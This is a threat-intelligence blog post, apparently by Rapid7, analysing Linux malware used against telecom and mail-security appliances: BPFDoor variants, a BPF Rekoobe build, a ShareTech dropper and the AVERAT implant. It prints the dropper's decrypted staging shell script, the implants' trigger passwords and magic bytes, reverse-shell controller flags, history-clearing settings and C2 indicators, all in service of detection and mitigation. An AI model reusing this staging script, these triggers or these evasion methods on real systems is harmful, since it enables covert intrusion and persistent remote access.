---
title: "SMTP is the key: BPFDoor and AVERAT hitting the network edge"
author: Rapid
url: https://www.rapid7.com/blog/post/tr-smtp-is-the-key-bpfdoor-averat-hitting-the-network-edge/
hostname: rapid7.com
description: Rapid7 Intelligence tracked a set of Linux samples that blend into the software and device conventions of the telecom environments they target. The set spans a newly observed BPFDoor variant, a BPF Rekoobe build seen against South Korean targets, a dropper, and six builds of a Linux implant deployed against Taiwanese appliances.
sitename: Rapid7
date: "2026-09-29"
categories: ['Threat Research']
tags: ['cybersecurity company,managed detection and response,exposure management,managed security solutions,vulnerability management,exposure assessment platform']
---
## Overview

Rapid7 tracked a set of Linux samples that blend into the software and device conventions of the telecom environments they target. The set spans a newly observed BPFDoor variant, a BPF Rekoobe build seen against South Korean targets, a dropper, and six builds of a Linux implant we track as *AVERAT*, deployed against Taiwanese appliances. Additionally, we provide source code details of the Rapid7 BPFDoor controller introduced in our April 2026 blog, [*Stealthy BPFDoor Variants are a Needle That Looks Like Hay*](https://www.rapid7.com/blog/post/tr-new-whitepaper-stealthy-bpfdoor-variants/).

The chain uses two binaries. A dropper writes a shell script to the appliance's storage mount and executes it. The script stages both payloads into /sbin under the names ntpdate and udevds, launches them, and deletes each file ten seconds later while the processes continue running. One of those payloads is the dropper itself, re-executing as a resident watchdog, leaving both processes running without an on-disk image.

The dropper derives its encryption key from the string ShareTech and lives in the appliance's own add-on package directory. The BPFDoor variants seen against South Korean systems impersonate the PID file of SpamSniper, a Korean anti-spam product, and rotate through ten Linux daemon names. Across the samples, each component adopts names and conventions designed to look unremarkable in the environment it targets.

The common thread is regionalized disguise: each sample is aware of the vendor’s software running on the targeted systems and implements process spoofing accordingly. Passive BPF implants avoid conventional port scans; while outbound beacons hide inside ordinary DNS, TCP, and traffic, the threat-actor(s) are leveraging SMTP to stay under the radar. Telecommunications and network-edge operators are most affected, including embedded devices such as CCTV and DVR systems that can sit close to the network core. Readers will learn how each component works, what binds the six AVERAT builds to one another, and which behaviors and indicators to hunt for.

## Technical analysis

### Rapid7 BPFDoor controller

*Figure 1: Overview of BPFDoor HTTP-tunneled trigger flow through edge proxy*

⠀

Following our introduction of the Rapid7 BPFDoor controller, published in [March](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/), this section examines new features from the reconstructed source code.

Earlier BPFDoor variants relied on raw "magic bytes" (like 0x7255 or 0x5293) sitting in the TCP or UDP headers. Once security vendors wrote static network signatures (Suricata/Snort) to detect these Layer 4 anomalies, the operators began targeting the edge proxies. By wrapping the magic packet in standard HTTPS POST requests and relying on SSL offloading common in telecom environments, the trigger can be delivered to the BPFDoor-infected node in a way that may evade conventional deep packet inspection.

Because proxies alter HTTP headers (adding X-Forwarded-For and changing User-Agent lengths), the malware can no longer rely on static byte offsets to find its payload. To solve this, the new controller sends fake, benign-looking web requests (e.g., POST /admin/login.aspx?id=99990) that are mathematically padded. This guarantees that the string "9999" lands at exactly offset 26 of the TCP payload consistently.

The backdoor uses this "9999" as a reference point, dynamically scans for the \r\n\r\n terminator, and extracts the hex-encoded command payload from the HTTP body.

The dogetlogin function contains the hardcoded paths blending in with legitimate requests:


*Figure 2: Hardcoded web login paths used by the dogetlogin function*

⠀

When running, the controller spoofs the identity of /usr/sbin/abrtd via set_proc_name and PR_SET_NAME. The #ifndef SOLARIS compiles safely across different operating systems, applying the abrtd disguise only where the Linux-specific prctl function is supported.


*Figure 3: Process name spoofing logic applying the abrtd disguise on non-Solaris systems*

⠀

The table below lists the Rapid7 controller flags, with new features identified relative to the TrendAI analysis marked accordingly.

| **Switch** | **Variable/Action** | **Description** | 
| -h | destip | Specifies the target host (the infected machine's IP address) to control. | 
| -d | dport | Sets the destination port on the infected host to send the trigger packet to. | 
| -l | lhost | Sets the remote IP address that the infected machine will connect back to (Reverse Shell). | 
| -s | lport | Sets the destination port to listen for incoming connections on the attacker's machine. | 
| -m | self = 1 | Sets the attacker's local IP address as the remote host, automatically setting up the local listener (overwrites -l). | 
| -b | bport | Instructs the controller to bind to a specified TCP port locally (Bind Shell mode). | 
| -n | nopass = 1 | Sends the packet without prompting for a password (sends an empty/hashed password). Often used just to check if the backdoor is alive. | 
| -i | raw = 2 | ICMP mode. Embeds the magic packet into an ICMP Echo Request. | 
| -u | raw = 3 | UDP mode. Sends the magic packet via a UDP datagram. | 
| -w | raw = 1 | TCP mode. Sends the magic packet via a raw TCP SYN packet. | 
| -f | magic_flag | Allows the operator to manually define a custom magic byte sequence (integer value). | 
| -o | magic_flag = 0x5571 | Quick-sets the magic bytes/flag to 0x5571. | 
| -H | hdestip | [NEW] Specifies a secondary "hidden" IP address to embed inside the newly added hip field used to relay the magic packet. | 
| -g | gethost | [NEW] Activates the HTTPS POST tunneling mode (dogetlogin). | 
| -D | dir | [NEW] Customizes the URI directory path to blend into specific web server logs when using the -g (HTTPS POST) mode. | 
| -v | debug = 1 | [NEW] Enables verbose/debug mode, which is particularly useful for printing out the crafted HTTP requests and responses. | 
| -t | tmout | [NEW] Sets a custom timeout value. | 
| -c | break; | [DEPRECATED] Parses the flag but takes no actions | 

*Table 1: Rapid7 BPFDoor Controller Flags and Descriptions*

### A new BPFDoor variant tied to the South Korean cluster

The BPFDoor variants create a raw PF_PACKET socket, attaching a classic BPF filter matching Rapid7 Variant F and using magic bytes 0x6693 (UDP), 0x4274 (TCP) and 0x7820 (ICMP). On a match, the implant extracts the source address and connects back to the sender if the password is gZbpx0, opens a bind shell if the password is sT21xf, and otherwise defaults to a UDP knock.

Strings are hidden with a rotating substitution alphabet. Decoding reveals a direct product-spoofing artifact and a set of service-name disguises. The SpamSniper /var/run/spamsniper.pid mutex, together with the sample provenance, ties this build to the South Korean cluster.

List of spoofed processes:

```
[watchdogd]                           /usr/sbin/chronyd
/usr/lib/polkit-1/polkitd --no-debug  /usr/sbin/rsyslogd -n
[scsi_tmf_6]                          /usr/sbin/crond -n
/usr/sbin/NetworkManager --no-daemon  /usr/bin/python -Es /usr/sbin/tuned -l -p
[charger_manager]                     [kaluad_sync]
```
⠀

SpamSniper is antispam software used mainly in South Korea, so this masquerade is consistent with targeting a Korean mail or telecom environment. The variants a37ea9897221d4495b538de72b74f2aa1d2ff09b7b6dcedd395aee58931adbf3 and 7e667ba5f9df912e02275d3cfe3809d16f822fe776f4035c84b118ebd925b1b5 share the same filter, packet parser, callback, and command paths.

### The data plane variant

The BPFDoor sample (a6f3b7f932761fb1fd5e74123f2482e36c65dd13e769af2ce08c65da195bfa7a) attaches a SOCK_RAW 16-BPF instructions parsing IP/TCP offsets and gates on a 14-byte payload (2B 76 C0 63 83 E9 5F E1 EE 69 3F 32 CD 94, unique per sample).


*Figure 4: BPF filtering for abc00922 TCP magic bytes*

⠀

It spoofs its process name to ora_ppmond, mimicking the naming convention of Oracle-backed telecom subscriber and provisioning platforms (HSS, OSS/BSS), a disguise that only reads as legitimate on hosts actually running that class of infrastructure. Once triggered, it opens a stock Tiny Shell session and dispatches single-byte 'S'/'U'/'D' commands — interactive shell, upload, download — the same switch-case and iptables NAT-redirect staging/teardown logic found byte-for-byte in a second sample 4435fcd6862921092614dbeaa880e4192352984686ebcd98f0ba13ee8e226ef9 (the latter spoofing /sniper/snipe/bin/dtnpd and /sniper/bin/ofgmd). These samples show BPFDoor operating as a modular framework that adapts to the telecom layer it targets, integrating Tiny Shell and Rekoobe logic to support exfiltration.


*Figure 5: Tinyshell logic integrated into BPFDoor*

⠀

### BPF Rekoobe

The sample 652508a9cf40bee883dc0e5e219dfeba71fe7dac591d01c89f74c21f73b4963f is a Rekoobe-based backdoor. It attaches a 26 BPF instruction filter, sniffing for TCP/UDP/SCTP IPv4 and UDP IPv6 traffic with source and destination ports equal 25. Strings are protected with a repeating-key XOR routine (uvTIgh47,@#R), which decodes internal markers and command tokens. The magic packet is authenticated against a 32-byte sequence: 5C A3 1E F9 72 84 DB 40 26 9F C8 35 E1 7D 0A B2 4D 68 93 0F E7 5A B4 21 8C D6 39 F2 47 1B 60 CE. C2 interactions begin by sending the following 12-byte handshake: 50 01 13 3F 08 5C 73 7B 1A 72 53 78 (decrypting to "%wGvo4GL62p*" using the XOR key above).

Process names are drawn from an encrypted table and set through argv rewriting (Table 2).

| **Spoofed process name** | **Description** | 
| /sniper/bin/crond -n | Sniper platform cron daemon | 
| /sniper/bin/earsd --start | earsd — Sniper EMS/alarm daemon (Element Management System) | 
| /usr/lib/polkit-1/polkitd --no-debug | Generic Linux disguise — blends on any distro | 
| /sniper/apache/bin/httpd -k start | Sniper's bundled Apache | 
| /sniper/snipe/bin/snipe-smtpd | Sniper's internal SMTP daemon | 

*Table 2: BPF Rekoobe Spoofed Process Names*

On a SpamSniper appliance, SMTP server-to-server relay traffic is the primary legitimate traffic type the appliance is designed to handle. A firewall in front of the appliance will commonly allow rules such as:

```
ACCEPT tcp --sport 25 --dport 25  (MTA relay)
ACCEPT tcp --dport 25             (inbound mail)
```
A magic packet with src=25, dst=25 would match the first rule and reach the raw socket before any stateful inspection. The implant authors understood exactly what traffic profile would be invisible on this specific class of host.

The command interface relies on the same cryptography (HMAC-SHA1, AES-CBC) and opcodes as the standard Tinyshell/Rekoobe.

By setting variables like VIMINIT="set viminfo=", HISTFILE=/dev/null, HISTSIZE=0, and HISTFILESIZE=0, the malware ensures that the attacker's commands are not logged to bash history nor to vim logs. The reverse shell spoofs "/sniper/autorun/rblsmtpd --start -n 9" and connects on the attacker's port 25. Rblsmtpd is a standard daemon used by mail servers (like qmail) to block mail from IPs listed in Real-time Blackhole Lists (RBLs).

### A dropper likely built for ShareTech appliances

The dropper (update:2bedc26d4b29b435c21962beed7db21188a0219a0d28334bba8b4fb1656d7b15) is an x86-64 ELF with a minimal import table — fopen, fwrite, fputs, fclose, chmod, system, strlen, sleep, access, memcpy, exit — and no networking. It is a local installer, run after access is already established.

It carries four AES-128-ECB blobs keyed on the first sixteen bytes of SHA1("ShareTech"), or 6C CA D5 17 0E 3D B8 17 B3 DF 52 E0 D9 71 B1 48. The operators seeded their own key derivation with the target vendor's name.


*Figure 6: AES key derivation seeding routine from SHA1("ShareTech")*

⠀

The blobs decrypt to three paths and a script:

```
/tmp/flag                        (precondition gate — checked, never written)
/HDD/ms6x2xTo64/updIptable.php   (shell script under a .php extension)
/HDD/ms6x2xTo64/execProcEnd     (watchdog marker)
#!/bin/sh
/bin/cp -f /addpkg/sbin/update /sbin/ntpdate
chmod 755 /sbin/ntpdate
/sbin/ntpdate &
sleep 10
rm -rf /sbin/ntpdate
/bin/cp -f /addpkg/sbin/agetty /sbin/udevds
chmod 755 /sbin/udevds
/sbin/udevds &
sleep 10
rm -rf /sbin/udevds
```
⠀

Execution is gated on one precondition: the install branch fires only when /tmp/flag already exists on the filesystem and the .php script does not. When the gate passes, the dropper writes the script to the appliance's bulk-storage mount, chmods it 0777, hands it to system(), and exits. Because system() runs sh -c against a file carrying a real shebang, /HDD must be both writable and exec-capable. A noexec mount returns EACCES, for which the shell offers no interpreter fallback.

The script then copies two malicious binaries from /addpkg into /sbin as ntpdate and udevds, runs each, and unlinks them ten seconds later. Both keep running with no on-disk image: /proc/<pid>/exe resolves to (deleted), so there is nothing to hash, quarantine or submit, and a responder grepping /sbin finds nothing at all.

The elegant part is that /sbin/ntpdate is the dropper re-executing itself; the second instance finds the .php already present, fails the gate, and drops into a two-second watchdog that recreates execProcEnd and re-writes the script whenever either disappears. That also explains the absence of any persistence code: /addpkg/sbin/ is the appliance's own add-on package directory, so the firmware's package startup very likely relaunches it at boot.

## AVERAT: A modular implant reaching into ORB

The dropper copies AVERAT into /sbin/udevds, marks it executable, launches it, sleeps ten seconds, and removes it.

### Command and control

The implant connects outbound to port 25 and speaks SMTP: it issues EHLO, requests STARTTLS, and only then begins its own encrypted session. On a mail security gateway, outbound SMTP to arbitrary mail exchangers is the device's core function, so the traffic is indistinguishable from legitimate work in flow records.

The TLS layer is hand-built rather than linked from a standard cryptographic library. A fixed ClientHello template is compiled into the binary, including a 40-entry cipher suite list and a fixed extension ordering. Peer authentication is deferred entirely to the application layer via a shared-secret handshake carrying the magic value 1571 (0x0623).

Check-ins occur every 600 to 699 seconds. Each reports hostname, current user, OS version, network interfaces, and logged-in users. The interval is stored in a hidden file at /var/lib/.db and can be changed by the operator, persisting across restarts.

*Figure 7: AVERAT beacon configuration details and persistent state file path structure*

⠀

AVERAT takes its name from its only disk artifact: var, which reads as AVE when XOR-encoded (Figure 7).

### Configuration

All operational values are held in a 276-byte encrypted blob. The key is derived from the blob's own first 16 bytes, folded with a further byte and a reverse XOR cascade; that key seeds RC4's key-scheduling algorithm, and the resulting S-box is used directly as a keystream. Each field starts at its own keystream offset, and the parity of that offset selects whether bytes are bitwise-inverted or nibble-rotated before the XOR.

Decrypted, the blob yields three 16-byte keys (transport, authentication, and a secondary handshake secret), the host table, the port table, a three-byte build tag, the timing state, and the .db path.

*Figure 8: Key derivation and keystream offset mapping*

⠀

The schema provides three host and port pairs; this build populates one.


*Figure 9: Decrypted AVERAT host and port table configuration slots*

⠀

Rapid7 developed an extractor for the AVERAT family. Figure 10 shows the results for the samples identified at the time of writing.


*Figure 10: AVERAT extractor results and sample hashes identified at the time of writing*

⠀

The MAC key and aux key are byte-identical in all six, while only one stream key is shared between a pair (Figure 10).

### Command set

Command codes are uint16 values grouped into bands by subsystem. The most operationally significant are below.

| **Code** | **Capability** | 
| 20 | Enumerate directory contents | 
| 21 | Download a file from the host, with resume support | 
| 22 | Upload a file to the host in chunks, appending on resume | 
| 25 | Recursively delete a file or directory tree | 
| 30 | Recursively walk a directory tree, resolving file ownership | 
| 629 | Enumerate running processes with command lines | 
| 632 | Terminate a process (SIGTERM) | 
| 842 | Overwrite the C2 host and port tables at runtime | 
| 912 | Open an interactive shell session — up to ten concurrently | 
| 914 | Write a command into an open shell session | 
| 916 | Reboot the appliance, flushing buffers to disk beforehand | 
| 1010 | Load or unload a shared-object module, extending the implant | 
| 1576 | Set the callback interval and persist it to .db | 
| 1618 | Open a proxy or port-forward channel through the appliance | 
| unknown | Close the socket and terminate the process immediately | 

*Table 4: AVERAT Command Codes and Capabilities*

## Infrastructure

The three IP addresses recovered from the configs represent compromised CPE belonging to third-party victims rather than intentional operator assets. Scan data shows all three sitting in Chunghwa Telecom's HiNet address space (AS3462), in three separate Taiwanese cities — Tainan, Banqiao and Taoyuan — each representing a distinct class of neglected, internet-facing consumer or SMB appliance.

59.125.211.65 is a Synology NAS belonging to a Taiwanese fuel-retail business, still serving a Laravel-based "cloud management system" on 81/82 behind a Let's Encrypt certificate that expired in October 2021, alongside an exposed MariaDB 5.5.62 instance that reached end of life in 2020. 122.116.138.33 is an embedded Taiwanese ADSL/FTTH SMB network appliance — gSOAP 2.8 on 8000 with a recording-management interface, HTTP Basic realms named SMB on 8081, 8082 and 10443, and a self-signed NetKlass Technology certificate valid from 2004 to 2014, MD5-signed with a 1024-bit key. 1.34.200.85 is a Dahua DH-XVR5116HS-I3 recorder. These are victim hosts repurposed as operational relays, selected on consistent criteria: reachable, unpatched, unmonitored, and unlikely to be audited.

The detail that binds them is PPTP on 1723, present on all three, returning a byte-identical banner (Firmware: 1, Hostname: local, Vendor: linux, fingerprint 261189147). A Dahua XVR ships no PPTP server. Synology's DSM offers one only as an optional package, disabled by default and deprecated in current releases. We assess this as operator-installed, which makes each node dual-purpose: an outbound relay terminating SMTP-disguised implant traffic, and an inbound routed VPN foothold into the host's own LAN. Combined with the RAT's own proxy commands, the campaign has relay capability at both ends of the connection.

The campaign is running two distinct C2 addressing strategies:

| **Strategy** | **Samples** | **Trade-off** | 
| Attacker-registered domain | bf8135f4, 2fe2dd40, a65048eb | Survives IP churn, re-pointable via DNS — leaves a seizable, sinkholable, monitorable name | 
| Hardcoded consumer-broadband IP | 4925bcca, a4379e11, 925c0418 | No DNS artifact at all, brittle against address rotation | 

*Table 5: C2 Addressing Strategies Comparison*

The relay layer is composed of consumer and small-business broadband CPE: a fuel retailer's NAS, an obsolete NetKlass appliance, and a CCTV recorder, each sitting on a domestic-grade line.

AVERAT's command-and-control infrastructure matches the device-class profile that CISA, NCSC-UK, and partner agencies described in their April 2026 joint advisory ([AA26-113A](https://www.cisa.gov/news-events/news/cisa-national-cyber-security-centre-ncsc-uk-and-global-partners-issue-advisory-chinese-government)) as the standard building blocks of China-nexus covert/ORB networks: end-of-life NAS, edge appliances, and DVRs chosen because their vulnerabilities will never be patched. We found no infrastructure or indicator overlap with any specific named ORB network (LapDogs/UAT-7810, SPACEHOP, or FLORAHOX), whose documented targeting instead centers on SOHO routers; AVERAT's infrastructure is consistent with the broader ORB device-class pattern rather than confirmed membership in a known network.

## Operator tradecraft

Three design decisions indicate operational maturity.

The dispatcher terminates the process on any unrecognized command code. This is inexpensive to implement and raises the cost of interactive probing or automated scanning against a live implant.

Support for ten concurrent shell sessions is consistent with provisioning for parallel operator access rather than a single interactive session..

The reboot handler calls sync() before forcing a restart through the kernel rather than through init. Flushing filesystem buffers before destroying volatile state is the behavior of an operator who knows precisely which artifacts persist across a restart and which do not — and in this chain everything happens in memory while the persistence needed to re-establish access is on disk.

## Detection guidance

File-based detection on the appliance is unlikely to succeed, because no payload persists in /sbin. We recommend prioritizing the following.

On the host, hunt for processes whose executable has been unlinked, which on Linux presents as a (deleted) suffix on the /proc/<pid>/exe target. To catch fileless and unlinked process execution, monitor process descriptors for instances where /proc/<pid>/exe points to an unlinked path, and inspect memory maps for executable pages lacking backing file paths on disk.

Additionally, alert on the presence of .db state files and dropper artifacts: the directory /HDD/ms6x2xTo64/, a shell script carrying a .php extension whose first bytes are #!/bin/sh, and a marker file execProcEnd containing the literal string end. A process-tree sequence of sh -c on a .php path, followed by cp and chmod into /sbin and an rm -rf of the same path within roughly ten seconds, provides high-fidelity detection of the staging sequence.

On the network, outbound SMTP from an appliance to mail-role hostnames that resolve to consumer-grade or embedded devices warrants investigation on its own.

## Mitigation 

Investigate unexpected raw packet sockets and classic BPF filters on Linux systems that do not require packet capture. Review outbound TCP port-25 callbacks from processes that are not mail services, particularly when the process renames itself to a common daemon or creates hidden PID and socket markers. Preserve short-lived staged binaries and collect process arguments, open file descriptors, socket metadata, and historical DNS records. Restrict management access to routers, DVRs, and other edge appliances, and monitor NFS or SMB mounts that could let an adjacent host write executables onto an embedded device.

## MITRE ATT&CK techniques

| **Technique** | **Evidence** | 
|---|---|
| T1584.008 Compromise Infrastructure: Network Devices | AVERAT C2 relays | 
| T1133 External Remote Services | PPTP on 1723 on all three AVERAT C2 relays | 
| T1480 Execution Guardrails | Dropper, BPFDoor | 
| T1059.004 Unix Shell | AVERAT | 
| T1129 Shared Modules | AVERAT | 
| T1037 Boot or Logon Initialization Scripts | Dropper | 
| T1205 Traffic Signaling | BPFDoor | 
| T1205.002 Traffic Signaling: Socket Filters | BPFDoor | 
| T1070.004 File Deletion | Dropper | 
| T1070.003 Clear Command History | AVERAT, BPFDoor | 
| T1070.006 Timestomp | BPFDoor | 
| T1036.004 Masquerade Task or Service | BPFDoor | 
| T1036.005 Match Legitimate Name or Location | BPFDoor, Dropper | 
| T1564.001 Hidden Files and Directories | AVERAT | 
| T1027 Obfuscated Files or Information | BPFDoor, AVERAT | 
| T1027.013 Encrypted/Encoded File | Dropper, AVERAT | 
| T1140 Deobfuscate/Decode Files or Information | AVERAT | 
| T1562.004 Disable or Modify System Firewall | BPFDoor | 
| T1083 File and Directory Discovery | AVERAT | 
| T1057 Process Discovery | AVERAT | 
| T1082 System Information Discovery | AVERAT | 
| T1033 System Owner/User Discovery | AVERAT | 
| T1016 System Network Configuration Discovery | AVERAT | 
| T1005 Data from Local System | Dropper | 
| T1041 Exfiltration Over C2 Channel | AVERAT | 
| T1030 Data Transfer Size Limits | AVERAT | 
| T1105 Ingress Tool Transfer | AVERAT | 
| T1071.003 Application Layer Protocol: Mail Protocols | AVERAT | 
| T1573.001 Encrypted Channel: Symmetric Cryptography | AVERAT, Rekoobe | 
| T1090 Proxy | AVERAT | 
| T1008 Fallback Channels | AVERAT | 
| T1529 System Shutdown/Reboot | AVERAT | 
| T1489 Service Stop | AVERAT | 

*Table 6: MITRE ATT&CK Techniques and Evidence*

## Indicators of compromise

| **Type** | **Value** | **Role** | 
|---|---|---|
| SHA-256 | 2bedc26d4b29b435c21962beed7db21188a0219a0d28334bba8b4fb1656d7b15 | Dropper /addpkg/sbin/update | 
| SHA-256 | bf8135f46ecedfe5bd06fcecbb2e721c2367ff765b18f4aa3f868e6597f49e47 | AVERAT | 
| SHA-256 | 4925bcca085ec504f51191645da278d8e96698d91f3c6df44146336c697b4de8 | AVERAT | 
| SHA-256 | a4379e115d3c4420f5d4b92561022d6e0897990e7297be65c033d47de68e6a6a | AVERAT | 
| SHA-256 | 925c041807d4fb9dfe2ad84f963c2a4c60ea1289f6a0bdccbfb944478ffc2cf2 | AVERAT | 
| SHA-256 | 2fe2dd402ee6f9c578fce6dd4b36daaa407e99133e5dd502f2afca80feb60150 | AVERAT | 
| SHA-256 | a65048eb30661e27f8edc2dd8d8c77ec87faec1f1750f6e04e7ecaf069a32858 | AVERAT | 

*Table 7: File Indicators — TW cluster*

| **SHA-256** | **Family** | 
|---|---|
| a37ea9897221d4495b538de72b74f2aa1d2ff09b7b6dcedd395aee58931adbf3 | SpamSniper BPFDoor sniffer | 
| 7e667ba5f9df912e02275d3cfe3809d16f822fe776f4035c84b118ebd925b1b5 | SpamSniper BPFDoor sniffer | 
| 652508a9cf40bee883dc0e5e219dfeba71fe7dac591d01c89f74c21f73b4963f | Rekoobe, dual port-25 BPF filter | 
| 4435fcd6862921092614dbeaa880e4192352984686ebcd98f0ba13ee8e226ef9 | Data plane BPFDoor | 
| a6f3b7f932761fb1fd5e74123f2482e36c65dd13e769af2ce08c65da195bfa7a | Data plane BPFDoor | 

*Table 8: File Indicators — SK Cluster*

| **Type** | **Value** | **Notes** | 
|---|---|---|
| Domain | mx.zxopfds.com | AVERAT C2 | 
| Domain | spam.suwaccqi.com | AVERAT C2 | 
| Domain | mx1.wwstifsteel.com | AVERAT C2 | 
| IPv4 | 59.125.211.65 | AVERAT C2 | 
| IPv4 | 122.116.138.33 | AVERAT C2 | 
| IPv4 | 1.34.200.85 | AVERAT C2 | 
| Port | TCP/25 | default AVERAT C2 port | 

*Table 9: Network Indicators of Compromise*

| **Path** | **Notes** | 
|---|---|
| updIptable.php | Shell script under a .php extension | 
| /HDD/ms6x2xTo64/execProcEnd | Watchdog marker | 
| /tmp/flag | Dropper precondition | 
| /var/lib/.db | AVERAT state file (bf8135f4, 925c0418, 2fe2dd40) | 
| /var/lib/.sencha | AVERAT state file (4925bcca) | 
| /var/lib/.us | AVERAT state file (a4379e11) | 
| /var/lib/.a | AVERAT state file (a65048eb) | 
| /var/run/spamsniper.pid | BPFDoor mutex | 
| /sbin/ntpdate, /sbin/udevds | Staging names | 
| /addpkg/sbin/update, /addpkg/sbin/agetty | Dropper and AVERAT payload locations | 

*Table 10: Host Artifacts*

| **Value** | **Meaning** | 
|---|---|
| 5d 0c f9 47 e4 ea 7b 18 1b ed 5e b1 fb 5c 56 3f | AVERAT MAC key | 
| 6b 6a 48 0e f8 ae 5f 1b 38 e6 c0 94 86 df e3 45 | AVERAT aux key | 
| 00 80 04 00 | AVERAT beacon tag | 
| 1571 / 0x0623 | AVERAT protocol magic | 

*Table 11: Cryptographic and Protocol Constants*

## Rapid7 customers

YARA rules and more IoCs are available in Rapid7’s Intelligence Hub along with ongoing intelligence on the latest campaigns.

## What defenders should take away from these campaigns

The components form a modular access ecosystem. The dropper executes AVERAT, which beacons to changeable infrastructure, while BPFDoor and Rekoobe samples wait for a magic packet before opening interactive access.

Across both campaigns, the network edge is a consistent focus. Each targets mail-security appliances that sit inline in front of the mail server, giving an implant positioned there visibility into an organization’s inbound and outbound traffic. Both also use port 25 to blend into expected SMTP activity, although the mechanism differs between the campaigns. In either case, command-and-control traffic can hide within a protocol that is normal for the device and may therefore attract less scrutiny.

This fits the broader BPFDoor pattern, where compromised IoT and SMB devices, including NAS units and DVRs, can act as operational relays that obscure the true source of magic-packet traffic before it reaches the passive backdoor. Newer samples also show how the malware continues to adapt to the environments it targets, including a second userland-level magic-packet check layered on top of the kernel BPF gate.

Rapid7 Variant G provides another example of that adaptation. It uses three BPF filters to preserve operational resilience on high-traffic edge nodes, with the filters left unoptimized because the libpcap version running on its end-of-life targets does not support filter optimization.

For defenders, the most useful detection opportunities remain raw packet sockets, BPF filters, port-25 callbacks from unexpected processes, process masquerading, and appliance-specific staging paths. Specific attribution should remain an ongoing assessment as new samples and infrastructure emerge.
